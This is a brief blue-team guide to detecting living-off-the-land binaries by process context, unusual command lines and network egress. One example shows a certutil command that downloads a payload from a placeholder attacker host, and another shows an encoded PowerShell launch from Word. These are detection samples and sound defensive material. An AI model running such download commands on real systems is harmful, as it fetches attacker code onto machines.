# Blue Team Detection Strategy for LOLBins

Living-off-the-land binaries (LOLBins) are hard to detect if your logic is purely signature-based. Most of these tools are legitimate binaries executing malicious intent.

## High-Signal Approach

Build detections around **context**, not only executable name.

- Parent-child process mismatches
- Unusual command-line patterns
- Network egress from binaries that rarely communicate externally
- Execution outside expected user or host role

## Practical Examples

### 1. Suspicious certutil usage

```text
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
```

### 2. Encoded PowerShell launched by office process

```text
WINWORD.EXE -> powershell.exe -enc ...
```

## Operational Advice

- Tag detections by confidence tiers.
- Route high-confidence chains directly to triage queue.
- Add environment-specific allowlists with expiration dates.

Detection engineering should be iterative. Review missed alerts weekly and tune quickly.
